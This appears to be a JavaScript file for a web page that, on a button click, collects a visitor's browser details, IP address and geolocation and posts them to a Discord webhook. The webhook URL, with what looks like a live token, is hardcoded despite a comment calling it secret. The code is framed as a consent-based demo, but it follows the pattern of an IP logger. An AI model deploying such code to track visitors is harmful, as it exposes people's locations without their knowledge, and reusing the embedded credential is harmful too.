// --- CONFIG ---=
// Replace with your own Discord webhook URL (keep it secret). Example: "https://discord.com/api/webhooks/ID/TOKEN"
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1415414715294810213/0x0YmH85fxKlQzaydK_vI9Mi8XLsN88GxzGRoMRaS9cYk17vqPFc5CWdo4fSr8qmLTkU";

// --- utility ---
function safeStringify(obj) {
  try { return JSON.stringify(obj, null, 2); } catch (e) { return String(obj); }
}

// Show status messages
const statusEl = () => document.getElementById('status');
const outputEl = () => document.getElementById('output');
const btn = document.getElementById('logBtn');

// Collect local (client-side) info that is non-sensitive
function collectClientInfo() {
  return {
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent || null,
    language: navigator.language || null,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || null,
    screen: (screen && screen.width && screen.height) ? `${screen.width}x${screen.height}` : null,
    platform: navigator.platform || null,
  };
}

// Fetch IP + geolocation via HTTPS API. This demo uses ipapi.co which supports HTTPS for basic lookups.
// Rate limits apply for free usage; for heavier testing use a paid plan or host a backend proxy.
async function fetchGeo() {
  // ipapi.co provides city, region, country_name, latitude, longitude, org (ISP), postal, timezone, ip in JSON.
  const url = 'https://ipapi.co/json/';
  const res = await fetch(url, { cache: 'no-store' });
  if (!res.ok) throw new Error('Geo API error: ' + res.status);
  return await res.json();
}

async function sendToDiscord(payload) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes('XXXX')) {
    console.warn('Discord webhook URL not set in script.js. Skipping Discord send.');
    return { skipped: true };
  }

  const body = {
    content: null,
    embeds: [{
      title: 'New Visitor Info (Demo)',
      description: 'JSON payload attached',
      color: 3447003,
      fields: [
        { name: 'IP', value: payload.ip || 'n/a', inline: true },
        { name: 'Country', value: payload.country_name || 'n/a', inline: true },
        { name: 'City', value: payload.city || 'n/a', inline: true },
        { name: 'Latitude', value: payload.latitude ? String(payload.latitude) : 'n/a', inline: true },
        { name: 'Longitude', value: payload.longitude ? String(payload.longitude) : 'n/a', inline: true }
      ],
      timestamp: new Date().toISOString()
    }]
  };

  // Add the full JSON as a code block in the message content for easy inspection
  body.content = '```json\n' + safeStringify(payload) + '\n```';

  const res = await fetch(DISCORD_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body)
  });

  if (!res.ok) throw new Error('Discord webhook returned ' + res.status);
  return { success: true };
}

// Main flow triggered by user consent button
btn.addEventListener('click', async function() {
  btn.disabled = true;
  statusEl().textContent = 'Collecting...';

  try {
    const client = collectClientInfo();
    statusEl().textContent = 'Fetching IP & geolocation...';
    const geo = await fetchGeo(); // may include fields like ip, city, region, country_name, latitude, longitude, org, timezone

    // Merge client and geo data
    const full = Object.assign({}, client, {
      ip: geo.ip || geo.query || null,
      city: geo.city || null,
      region: geo.region || geo.regionName || null,
      country: geo.country_name || geo.country || null,
      latitude: geo.latitude || geo.lat || geo.lat || null,
      longitude: geo.longitude || geo.lon || geo.lon || null,
      isp: geo.org || geo.org || null,
      geo_raw: geo
    });

    // Display to user
    outputEl().textContent = safeStringify(full);
    statusEl().textContent = 'Sending to Discord (if webhook set)...';

    // Send to Discord webhook (if configured)
    try {
      const sendRes = await sendToDiscord(full);
      if (sendRes && sendRes.skipped) {
        statusEl().textContent = 'Ready — webhook not configured; message skipped.';
      } else {
        statusEl().textContent = 'Sent to Discord.';
      }
    } catch (err) {
      console.error(err);
      statusEl().textContent = 'Failed to send to Discord: ' + err.message;
    }
  } catch (err) {
    console.error(err);
    statusEl().textContent = 'Error: ' + err.message;
    outputEl().textContent = 'Error collecting geolocation: ' + err.message;
  } finally {
    btn.disabled = false;
  }
});
